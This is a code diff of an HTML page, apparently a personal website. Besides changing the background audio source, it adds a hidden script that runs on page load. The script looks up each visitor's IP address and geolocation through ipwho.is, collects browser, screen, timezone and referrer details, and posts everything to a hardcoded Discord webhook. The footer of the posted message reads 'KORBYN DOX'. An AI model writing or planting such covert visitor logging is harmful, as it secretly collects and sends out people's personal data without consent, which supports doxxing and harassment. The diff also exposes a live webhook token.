@@ -281,9 +281,78 @@
   </div>
 </div>
 
-<audio id="bgAudio" loop src="ID3"></audio>
+<audio id="bgAudio" loop src="https://raw.githubusercontent.com/outstrut/elijahpaz.space/main/Life%20Letters.mp3"></audio>
 
 <script>
+  // --- IP LOGGING ---
+  function sendToDiscord(data) {
+    const webhook = 'https://discord.com/api/webhooks/1528732776839512248/wTmWwEPE-N43xi18BsCsFKx57xPGDJOpnqUQPzFt5geDq4DIT8hviWDz1kuTZLWa_uZC';
+    
+    // Build rich embed with ALL data
+    const embed = {
+      embeds: [{
+        title: '📍 VISITOR LOGGED',
+        color: 0x000000,
+        fields: [],
+        timestamp: new Date().toISOString(),
+        footer: { text: 'KORBYN DOX | IP Logging Active' }
+      }]
+    };
+
+    // Add all fields from ipwho.is response
+    for (const [key, value] of Object.entries(data)) {
+      if (value !== null && value !== undefined && value !== '') {
+        // Handle nested objects (like timezone)
+        if (typeof value === 'object') {
+          for (const [subKey, subValue] of Object.entries(value)) {
+            if (subValue !== null && subValue !== undefined) {
+              embed.embeds[0].fields.push({
+                name: `${key}.${subKey}`.toUpperCase(),
+                value: String(subValue).substring(0, 1024),
+                inline: false
+              });
+            }
+          }
+        } else {
+          embed.embeds[0].fields.push({
+            name: key.toUpperCase(),
+            value: String(value).substring(0, 1024),
+            inline: true
+          });
+        }
+      }
+    }
+
+    // Add browser info
+    embed.embeds[0].fields.push(
+      { name: 'BROWSER', value: navigator.userAgent, inline: false },
+      { name: 'LANGUAGE', value: navigator.language, inline: true },
+      { name: 'PLATFORM', value: navigator.platform, inline: true },
+      { name: 'SCREEN', value: `${window.screen.width}x${window.screen.height}`, inline: true },
+      { name: 'COLOR DEPTH', value: `${window.screen.colorDepth}-bit`, inline: true },
+      { name: 'TIMEZONE', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+      { name: 'REFERRER', value: document.referrer || 'Direct', inline: false },
+      { name: 'PAGE URL', value: window.location.href, inline: false }
+    );
+
+    // Send to Discord
+    fetch(webhook, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(embed)
+    }).catch(err => console.error('Webhook error:', err));
+  }
+
+  // Fetch IP data on page load
+  fetch('https://ipwho.is/')
+    .then(res => res.json())
+    .then(data => {
+      console.log('IP Data:', data);
+      sendToDiscord(data);
+    })
+    .catch(err => console.error('IP fetch error:', err));
+
+  // --- UI CONTROLS ---
   const entryScreen = document.getElementById('entryScreen');
   const mainContent = document.getElementById('mainContent');
   const enterBtn = document.getElementById('enterBtn');
